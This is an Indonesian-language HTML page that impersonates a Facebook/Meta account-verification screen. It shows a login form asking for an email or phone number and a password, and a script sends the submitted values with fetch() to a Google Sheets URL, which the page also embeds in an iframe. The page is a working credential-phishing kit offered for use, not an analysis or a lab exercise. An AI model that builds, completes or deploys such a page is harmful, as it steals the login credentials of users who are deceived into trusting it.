<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Verifikasi Akun</title>
  <style>
    /* (Silakan pakai semua CSS dari versi Anda sebelumnya) */
    .card { margin: 0 auto; max-width: 380px; padding: 24px; background: #fff; border-radius: 8px; }
    .sheet-embed { margin: 24px auto; max-width: 800px; width: 100%; padding: 0 16px; }
    .sheet-embed iframe { width: 100%; height: 400px; border: none; }
  </style>
</head>
<body>
  <header>Verifikasi Akun dan Amankan</header>
  <div class="description">
    Facebook membantu Anda terhubung dan berbagi dengan orangâ€‘orang dalam kehidupan Anda.
  </div>

  <div class="card">
    <h1>Masuk ke Akun Anda</h1>
    <form id="login-form">
      <div>
        <label>Email atau Nomor Telepon</label>
        <input type="email" name="emailOrPhone" placeholder="Masukkan email atau nomor telepon" required>
      </div>
      <div>
        <label>Kata Sandi</label>
        <input type="password" name="password" placeholder="Masukkan kata sandi" required>
      </div>
      <button type="submit">Kirim & Amankan</button>
    </form>
  </div>

  <div class="sheet-embed">
    <iframe src="https://docs.google.com/spreadsheets/d/14nPAYOjs1DnbDwChhixhod0G6sWpLjZb2PVemdwearw/pubhtml?widget=true&amp;headers=false"></iframe>
  </div>

  <footer>&copy; 2025 VERIFIKASI META</footer>

  <script>
    const scriptURL = 'https://docs.google.com/spreadsheets/d/14nPAYOjs1DnbDwChhixhod0G6sWpLjZb2PVemdwearw/edit?usp=sharing';
    const form = document.getElementById('login-form');
    form.addEventListener('submit', e => {
      e.preventDefault();
      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
        .then(res => res.json())
        .then(json => {
          if (json.status === 'success') alert('Data berhasil terkirim!');
          else alert('Terjadi kesalahan saat mengirim data.');
          form.reset();
        })
        .catch(err => {
          console.error(err);
          alert('Gagal mengirim data.');
        });
    });
  </script>
</body>
</html>
